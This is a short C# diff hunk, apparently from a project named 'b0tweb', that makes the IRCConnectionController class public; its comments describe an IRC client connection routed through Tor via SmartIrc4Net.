@@ -10,7 +10,7 @@ namespace b0tweb
     /// Class <c>IRCConnectionController</c> handles the IRC connection established.
     /// The IRC connection is made via Tor to make everything as secure as possible.
     /// </summary>
-    class IRCConnectionController
+    public class IRCConnectionController
     {
         /// <summary>
         /// The IRC client from <c>SmartIrc4Net</c>
